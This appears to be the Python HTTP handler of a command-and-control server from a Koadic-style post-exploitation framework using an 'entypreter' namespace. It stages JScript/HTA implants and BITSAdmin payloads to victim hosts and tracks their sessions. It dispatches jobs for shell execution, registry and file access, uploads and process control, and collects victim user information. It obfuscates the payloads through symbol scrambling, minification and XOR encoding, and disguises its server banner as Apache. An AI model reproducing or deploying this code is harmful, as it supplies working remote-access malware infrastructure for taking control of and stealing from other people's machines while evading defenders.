try:
    from SocketServer import ThreadingMixIn
    from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
    from urlparse import parse_qs
except:
    # why is python3 so terrible for backward compatibility?
    from socketserver import ThreadingMixIn
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from urllib.parse import parse_qs

import cgi
import socket
import random
import threading
import os
import ssl
import io
import time
import copy
import core.job
import core.session
import core.loader


class Handler(BaseHTTPRequestHandler):

    def reply(self, status, data=b"", headers={}):
        self.shell.print_verbose("handler::reply() - sending status %d with %d bytes to %s" % (status, len(data), str(self.client_address)))

        self.send_response(status)

        for key, value in headers.items():
            self.send_header(key, value)

        self.end_headers()

        # python is so utterly incapable that we have to write CS 101 socket
        # code
        if data != b"":
            total = len(data)
            written = 0
            while written < total:
                a = self.wfile.write(data[written:])
                self.wfile.flush()

                if a is None:
                    break

                written += a

    def send_file(self, fname):
        with open(fname, "rb") as f:
            fdata = f.read()

        headers = {}
        headers['Content-Type'] = 'application/octet-stream'
        headers['Content-Length'] = len(fdata)
        self.reply(200, fdata, headers)

    def get_header(self, header, default=None):
        if header in self.headers:
            return self.headers[header]

        return default

    # ignore log messages
    def log_message(*arg):
        pass

    def setup(self):
        self.timeout = 90000
        BaseHTTPRequestHandler.setup(self)
        self.request.settimeout(90000)

    #BaseHTTPServer.server_version = 'Apache'
    #BaseHTTPServer.sys_version = ''
    def version_string(self):
        return 'Apache'

    def handle(self):
        """Handles a request ignoring dropped connections."""
        try:
            self.stager = self.server.stager
            self.shell = self.stager.shell
            self.options = copy.deepcopy(self.server.server.options)
            self.loader = core.loader

            self.shell.print_verbose("handler::handle() - Incoming HTTP from %s" % str(self.client_address))

            return BaseHTTPRequestHandler.handle(self)
        except (socket.error, socket.timeout) as e:
            pass
        # except:
            # pass

    def init_session(self, stage=True):
        if stage:
            ip = self.client_address
            agent = self.get_header('user-agent', '')

            self.session = core.session.Session(
                self.server.server, ip[0], agent)
            self.server.server.sessions.append(self.session)

        self.session.update_active()
        self.options.set("SESSIONKEY", self.session.key)
        self.options.set("SESSIONPATH", "%s=%s;" %
                         (self.options.get("SESSIONNAME"), self.session.key))

    def parse_params(self):
        splitted = self.path.split("?")
        self.endpoint = splitted[0]

        endpoint = self.options.get("FENDPOINT").strip()

        if len(endpoint) > 0:
            if self.endpoint[1:] != endpoint:
                return False

        self.get_params = parse_qs(splitted[1]) if len(splitted) > 1 else {}
        self.session = None
        self.job = None

        sesskey = self.options.get("SESSIONNAME")
        if sesskey in self.get_params:
            self.session = self.find_session(self.get_params[sesskey][0])

            if not self.session:
                return False
            self.init_session(False)

        jobkey = self.options.get("JOBNAME")
        if jobkey in self.get_params:
            self.shell.print_verbose("self.params:  %s" % self.get_params)
            if self.get_params[jobkey][0] != "stage":
                self.job = [job for job in self.shell.jobs if job.key == self.get_params[jobkey][0]][0]

            if self.job:
                self.shell.print_verbose("handler::parse_params() - fetched job_key = %s" % (self.job.key))
                self.options.set("JOBKEY", self.job.key)
                self.options.set("JOBPATH", "%s=%s;" % (jobkey, self.job.key))

        elif self.shell.continuesession:
            self.session = self.shell.continuesession


        return True

    def do_HEAD(self):
        splitted = self.path.split("?")
        self.endpoint = splitted[0]

        endpoint = self.options.get("FENDPOINT").strip()

        if len(endpoint) > 0:
            if self.endpoint[1:] != endpoint:
                self.reply(404)
                return

        self.init_session()
        template = self.options.get("_STAGETEMPLATE_")
        self.session.bitsadmindata = self.post_process_script(self.options.get("_STAGE_"), template)
        self.shell.continuesession = self.session
        headers = {}
        headers['Content-Length'] = len(self.session.bitsadmindata)
        self.reply(200, '', headers)

    # the initial stage is a GET request
    def do_GET(self):
        if self.parse_params():
            if self.options.get("ONESHOT") == "true":
                return self.handle_oneshot()

            if not self.session:
                return self.handle_new_session()

            if self.shell.continuesession:
                return self.handle_bitsadmin_stage()

            if self.job:
                return self.handle_job()

            return self.handle_stage()

        self.reply(404)

    def do_POST(self):
        if self.parse_params():
            if self.options.get("ONESHOT") == "true":
                return self.handle_report()

            if not self.session:
                return self.reply(403)

            if not self.job:
                content_len = int(self.get_header('content-length', 0))

                if content_len == 0:
                    return self.handle_work()

                data = self.rfile.read(content_len)
                self.session.parse_user_info(data)
                self.shell.play_sound('STAGED')

                module = self.session.stager.options.get('MODULE')
                if module:
                    plugin = self.session.shell.plugins[module]
                    old_session = plugin.options.get("session")
                    plugin.options.set("session", str(self.session.id))
                    plugin.run()
                    plugin.options.set("session", old_session)

                return self.reply(200)


            return self.handle_report()

        return self.reply(404)

    def handle_stage(self):
        self.shell.print_verbose("handler::handle_stage()")
        self.options.set("JOBKEY", "stage")
        template = self.options.get("_FORKTEMPLATE_")
        data = self.post_process_script(self.options.get("_STAGE_"), template)
        self.reply(200, data)

    def handle_oneshot(self):
        plugin = self.shell.plugins[self.options.get("MODULE")]
        options = copy.deepcopy(plugin.options)
        workload = self.loader.load_script("data/"+self.options.get("MODULE")+".js", plugin.options)
        j = plugin.job(self.shell, -1, plugin.STATE, workload, options)
        if j.create == False:
            script = b"entypreter.exit();"
            template = self.options.get("_STAGETEMPLATE_")
            script = self.post_process_script(script, template)

            self.reply(200, script)
            return

        j.ip = str(self.client_address[0])
        self.shell.jobs.append(j)

        self.shell.print_verbose("handler::handle_oneshot()")
        self.options.set("JOBKEY", j.key)
        script = j.payload()
        template = self.options.get("_STAGETEMPLATE_")
        script = self.post_process_script(script, template)

        self.reply(200, script)

    def handle_new_session(self):
        self.shell.print_verbose("handler::handle_new_session()")
        self.init_session()
        template = self.options.get("_STAGETEMPLATE_")
        data = self.post_process_script(self.options.get("_STAGE_"), template)
        self.reply(200, data)

    def handle_bitsadmin_stage(self):
        rangeheader = self.get_header('range')
        headers = {}
        headers['Content-Length'] = len(self.session.bitsadmindata)
        headers['Accept-Ranges'] = "bytes"
        headers['Content-Range'] = "bytes 0-" + str(len(self.session.bitsadmindata)-1) + "/" + str(len(self.session.bitsadmindata))
        headers['Content-Type'] = 'application/octet-stream'
        if rangeheader:
            rangehead = rangeheader.split("=")[1]
            if int(rangehead.split("-")[1]) > len(self.session.bitsadmindata)-1:
                end = len(self.session.bitsadmindata)-1
            else:
                end = int(rangehead.split("-")[1])
            headers['Content-Range'] = "bytes " + rangehead.split("-")[0] + "-"+ str(end) + "/" + str(len(self.session.bitsadmindata))
            partdata = self.session.bitsadmindata[int(rangehead.split("-")[0]):end+1]
            return self.reply(206, partdata, headers)
        else:
            return self.reply(200, self.session.bitsadmindata, headers)

    def handle_job(self):
        script = self.job.payload()
        template = self.options.get("_FORKTEMPLATE_")
        script = self.post_process_script(script, template)
        self.reply(200, script)

    def handle_work(self):
        count = 0
        while True:
            if self.session.killed:
                return self.reply(500, "");

            job = self.session.get_created_job()
            if job is not None:
                break

            try:
                self.request.settimeout(1)
                if len(self.request.recv(1)) == 0:
                    return
            except Exception as e:
                pass
            self.session.update_active()
            count += 1
            if count > 600:
                self.reply(201, "")
                return

        job.receive()

        # hack to tell us to fork 32 bit
        status = 202 if job.fork32Bit else 201

        self.reply(status, job.key.encode())

    def handle_report(self):
        content_len = int(self.get_header('content-length', 0))
        data = self.rfile.read(content_len)

        errno = self.get_header('errno', False)
        if errno:
            errdesc = self.get_header('errdesc', 'No Description')
            errname = self.get_header('errname', 'Error')
            self.job.error(errno, errdesc, errname, data)
            self.reply(200)
            return

        self.job.report(self, data)

    def find_session(self, key):
        #key = key[0].decode()
        for session in self.server.server.sessions:
            if session.key == key:
                self.shell.print_verbose("handler::find_session() - found session.key = %s" % (key))
                return session

        self.shell.print_verbose("handler::find_session() - COULD NOT FIND session.key = %s" % (key))
        return None

    def do_post(self):
        self.do_POST()

    def do_get(self):
        self.do_GET()

    def parse_post_vars(self):
        ctype, pdict = cgi.parse_header(self.headers['content-type'])
        if ctype == 'multipart/form-data':
            postvars = cgi.parse_multipart(self.rfile, pdict)
        elif ctype == 'application/x-www-form-urlencoded':
            length = int(self.headers['content-length'])
            postvars = parse_qs(self.rfile.read(length), keep_blank_values=1)
        else:
            postvars = {}
        return postvars

    # this removes functions that the current script doesn't use
    def trim_stdlib(self, stdlib, script):
        stdlib = stdlib.decode()
        script = script.decode()

        sleepflag = False
        exitflag = False
        if "entypreter.sleep" not in script:
            stdlib = stdlib.split("//sleep.start")[0] + stdlib.split("//sleep.end")[1]
            sleepflag = True
        if "entypreter.exit" not in script:
            stdlib = stdlib.split("//exit.start")[0] + stdlib.split("//exit.end")[1]
            exitflag = True
        if "entypreter.isHTA" not in script and sleepflag and exitflag:
            stdlib = stdlib.split("//isHTA.start")[0] + stdlib.split("//isHTA.end")[1]
        if "entypreter.isWScript" not in script:
            stdlib = stdlib.split("//isWScript.start")[0] + stdlib.split("//isWScript.end")[1]
        userinfoflag = False
        if "entypreter.user.info" not in script:
            stdlib = stdlib.split("//user.info.start")[0] + stdlib.split("//user.info.end")[1]
            userinfoflag = True
        useriselevatedflag = False
        if "entypreter.user.isElevated" not in script and userinfoflag:
            stdlib = stdlib.split("//user.isElevated.start")[0] + stdlib.split("//user.isElevated.end")[1]
            useriselevatedflag = True
        if "entypreter.user.OS" not in script and userinfoflag:
            stdlib = stdlib.split("//user.OS.start")[0] + stdlib.split("//user.OS.end")[1]
        if "entypreter.user.DC" not in script and userinfoflag:
            stdlib = stdlib.split("//user.DC.start")[0] + stdlib.split("//user.DC.end")[1]
        if "entypreter.user.Arch" not in script and userinfoflag:
            stdlib = stdlib.split("//user.Arch.start")[0] + stdlib.split("//user.Arch.end")[1]
        usercwdflag = False
        if "entypreter.user.CWD" not in script and userinfoflag:
            stdlib = stdlib.split("//user.CWD.start")[0] + stdlib.split("//user.CWD.end")[1]
            usercwdflag = True
        useripaddrsflag = False
        if "entypreter.user.IPAddrs" not in script and userinfoflag:
            stdlib = stdlib.split("//user.IPAddrs.start")[0] + stdlib.split("//user.IPAddrs.end")[1]
            useripaddrsflag = True
        workerrorflag = False
        if "entypreter.work.error" not in script:
            stdlib = stdlib.split("//work.error.start")[0] + stdlib.split("//work.error.end")[1]
            workerrorflag = True
        workgetflag = False
        if "entypreter.work.get" not in script:
            stdlib = stdlib.split("//work.get.start")[0] + stdlib.split("//work.get.end")[1]
            workgetflag = True
        workforkflag = False
        if "entypreter.work.fork" not in script:
            stdlib = stdlib.split("//work.fork.start")[0] + stdlib.split("//work.fork.end")[1]
            workforkflag = True
        httpuploadflag = False
        if "entypreter.http.upload" not in script:
            stdlib = stdlib.split("//http.upload.start")[0] + stdlib.split("//http.upload.end")[1]
            httpuploadflag = True
        workreportflag = False
        if "entypreter.work.report" not in script and workerrorflag and httpuploadflag:
            stdlib = stdlib.split("//work.report.start")[0] + stdlib.split("//work.report.end")[1]
            workreportflag = False
        httpdownloadflag = False
        if "entypreter.http.download" not in script:
            stdlib = stdlib.split("//http.download.start")[0] + stdlib.split("//http.download.end")[1]
            httpdownloadflag = True
        if "entypreter.work.make_url" not in script and workgetflag and workforkflag and workreportflag and httpdownloadflag:
            stdlib = stdlib.split("//work.make_url.start")[0] + stdlib.split("//work.make_url.end")[1]
        httpdownloadexflag = False
        if "entypreter.http.downloadEx" not in script and httpdownloadflag:
            stdlib = stdlib.split("//http.downloadEx.start")[0] + stdlib.split("//http.downloadEx.end")[1]
            httpdownloadexflag = True
        httpgetflag = False
        if "entypreter.http.get" not in script and httpdownloadexflag:
            stdlib = stdlib.split("//http.get.start")[0] + stdlib.split("//http.get.end")[1]
            httpgetflag = True
        httppostflag = False
        if "entypreter.http.post" not in script and workgetflag and workreportflag and httpdownloadexflag:
            stdlib = stdlib.split("//http.post.start")[0] + stdlib.split("//http.post.end")[1]
            httppostflag = True
        if "entypreter.http.create" not in script and httpgetflag and httppostflag:
            stdlib = stdlib.split("//http.create.start")[0] + stdlib.split("//http.create.end")[1]
        httpaddheadersflag = False
        if "entypreter.http.addHeaders" not in script and httpgetflag and httppostflag:
            stdlib = stdlib.split("//http.addHeaders.start")[0] + stdlib.split("//http.addHeaders.end")[1]
            httpaddheadersflag = True
        if "entypreter.http.bin2str" not in script and httpdownloadexflag:
            stdlib = stdlib.split("//http.bin2str.start")[0] + stdlib.split("//http.bin2str.end")[1]
        processcurrentpidflag = False
        if "entypreter.process.currentPID" not in script:
            stdlib = stdlib.split("//process.currentPID.start")[0] + stdlib.split("//process.currentPID.end")[1]
            processcurrentpidflag = True
        processkillflag = False
        if "entypreter.process.kill" not in script:
            stdlib = stdlib.split("//process.kill.start")[0] + stdlib.split("//process.kill.end")[1]
            processkillflag = True
        if "entypreter.process.list" not in script and processcurrentpidflag and processkillflag:
            stdlib = stdlib.split("//process.list.start")[0] + stdlib.split("//process.list.end")[1]
        registrywriteflag = False
        if "entypreter.registry.write" not in script:
            stdlib = stdlib.split("//registry.write.start")[0] + stdlib.split("//registry.write.end")[1]
            registrywriteflag = True
        registryreadflag = False
        if "entypreter.registry.read" not in script:
            stdlib = stdlib.split("//registry.read.start")[0] + stdlib.split("//registry.read.end")[1]
            registryreadflag = True
        registrydestroyflag = False
        if "entypreter.registry.destroy" not in script:
            stdlib = stdlib.split("//registry.destroy.start")[0] + stdlib.split("//registry.destroy.end")[1]
            registrydestroyflag = True
        if "entypreter.registry.provider" not in script and registrywriteflag and registryreadflag and registrydestroyflag:
            stdlib = stdlib.split("//registry.provider.start")[0] + stdlib.split("//registry.provider.end")[1]
        if "entypreter.WMI.createProcess" not in script and workforkflag and processcurrentpidflag:
            stdlib = stdlib.split("//WMI.createProcess.start")[0] + stdlib.split("//WMI.createProcess.end")[1]
        shellexecflag = False
        if "entypreter.shell.exec" not in script and userinfoflag and useriselevatedflag and usercwdflag and useripaddrsflag:
            stdlib = stdlib.split("//shell.exec.start")[0] + stdlib.split("//shell.exec.end")[1]
            shellexecflag = True
        if "entypreter.user.shellchcp" not in script and userinfoflag and shellexecflag:
            stdlib = stdlib.split("//user.shellchcp.start")[0] + stdlib.split("//user.shellchcp.end")[1]
        fileget32bitfolderflag = False
        if "entypreter.file.get32BitFolder" not in script and workforkflag:
            stdlib = stdlib.split("//file.get32BitFolder.start")[0] + stdlib.split("//file.get32BitFolder.end")[1]
            fileget32bitfolderflag = True
        filereadbinaryflag = False
        if "entypreter.file.readBinary" not in script and httpuploadflag and shellexecflag:
            stdlib = stdlib.split("//file.readBinary.start")[0] + stdlib.split("//file.readBinary.end")[1]
            filereadbinaryflag = True
        filereadtextflag = False
        if "entypreter.file.readText" not in script and shellexecflag and filereadbinaryflag:
            stdlib = stdlib.split("//file.readText.start")[0] + stdlib.split("//file.readText.end")[1]
            filereadtextflag = True
        if "entypreter.shell.run" not in script and filereadbinaryflag and filereadtextflag:
            stdlib = stdlib.split("//shell.run.start")[0] + stdlib.split("//shell.run.end")[1]
        if "entypreter.user.encoder" not in script and userinfoflag and httpuploadflag and httpaddheadersflag and shellexecflag and filereadbinaryflag:
            stdlib = stdlib.split("//user.encoder.start")[0] + stdlib.split("//user.encoder.end")[1]
        if "entypreter.uuid" not in script and userinfoflag and useriselevatedflag and useripaddrsflag and filereadbinaryflag:
            stdlib = stdlib.split("//uuid.start")[0] + stdlib.split("//uuid.end")[1]
        filewriteflag = False
        if "entypreter.file.write" not in script and httpdownloadexflag:
            stdlib = stdlib.split("//file.write.start")[0] + stdlib.split("//file.write.end")[1]
            filewriteflag = True
        filedeletefileflag = False
        if "entypreter.file.deleteFile" not in script and shellexecflag and filereadbinaryflag:
            stdlib = stdlib.split("//file.deleteFile.start")[0] + stdlib.split("//file.deleteFile.end")[1]
            filedeletefileflag = True
        if "entypreter.file.getPath" not in script and processcurrentpidflag and shellexecflag and fileget32bitfolderflag and filereadbinaryflag and filereadtextflag and filewriteflag and filedeletefileflag:
            stdlib = stdlib.split("//file.getPath.start")[0] + stdlib.split("//file.getPath.end")[1]

        stdlib += "\n"

        return stdlib.encode()

    # ugly dragons, turn back
    def scramble(self, data):
        import string
        import random
        symbols = set()
        data2 = data.replace(b"\n", b" ")
        for symbol in data2.split(b" "):
            if symbol.startswith(b'entypreter') and b'(' not in symbol and b')' not in symbol and b';' not in symbol:
                symbols.add(symbol)
            if symbol.startswith(b'#') and symbol.endswith(b'#'):
                symbols.add(symbol)
            if symbol.startswith(b'#') and b'#(' in symbol:
                symbols.add(symbol.split(b'(')[0])

        symbols = list(symbols)
        symbols = sorted(symbols, key=lambda x: x.count(b'.'))

        obnames = []

        finalize = []
        mapping = {}

        for symindex, symbol in enumerate(symbols):
            while True:
                obname = ''.join(random.choice(string.ascii_uppercase) for _ in range(10)).encode()
                if obname not in obnames:
                    obnames.append(obname)
                    break


            fixed = []
            basename = b""
            foundyet = False
            for part in symbol.split(b"."):
                if not foundyet:
                    if part in mapping:
                        fixed.append(mapping[part])
                    else:
                        foundyet = True
                        mapping[part] = obname
                        fixed.append(obname)
                        break
                else:
                    fixed.append(part)

            new_name = b".".join(fixed)

            tup = (symbol, new_name)
            finalize.append(tup)

        finalize = sorted(finalize, key=lambda x: (x[0].count(b"."), len(x[0])), reverse=True)
        for final in finalize:
            data = data.replace(final[0], final[1])

        # print(data.decode())
        return data

    def post_process_script(self, script, template, stdlib=True):
        if stdlib:
            stdlib_content = self.options.get("_STDLIB_")
            trimmed_stdlib = self.trim_stdlib(stdlib_content, script)
            script = trimmed_stdlib + script

            # crappy hack for forkcmd
            forkopt = copy.deepcopy(self.options)
            forkopt.set("URL", "***K***")
            forkopt.set("_JOBPATH_", "")
            forkopt.set("_SESSIONPATH_", "")
            forkcmd = self.options.get("_FORKCMD_")
            forkcmd = self.loader.apply_options(forkcmd, forkopt)

            self.options.set("_FORKCMD_", forkcmd.decode())

        # template = self.options.get("_TEMPLATE_")

        script = self.loader.apply_options(script, self.options)

        # obfuscate the script!
        import string
        script = self.scramble(script) # script.replace(b"entypreter", ''.join(random.choice(string.ascii_uppercase) for _ in range(10)).encode())
        '''
        import uuid
        jsfile = "/tmp/" + uuid.uuid4().hex
        outfile = "/tmp/" + uuid.uuid4().hex
        from subprocess import call
        open(jsfile, "wb").write(script)
        print("Wrote to: " + jsfile)
        call(["uglifyjs", "-o", outfile, "--compress", "--mangle", "--mangle-props", "--toplevel", jsfile])
        print("Outfile: " + outfile)
        script = open(outfile, "rb").read()
        script = script.replace(b".in", b"m222")
        '''

        # minify the script
        from rjsmin import jsmin
        script = jsmin(script.decode()).encode()
        # print(script.decode())

        # obfuscation options
        if self.stager.options.get("OBFUSCATE"):
            if self.stager.options.get("OBFUSCATE") == "xor":
                xor_key = self.loader.create_xor_key()
                xor_script = self.loader.xor_data(script, xor_key)
                script = self.loader.xor_js_file(xor_script.decode(), xor_key).encode()
            script = jsmin(script.decode()).encode()

        script = template.replace(b"~SCRIPT~", script)
        if self.session and self.session.encoder:
            encoder = self.session.encoder
        else:
            encoder = "1252"
        script = script.decode().encode("cp"+encoder)
        return script
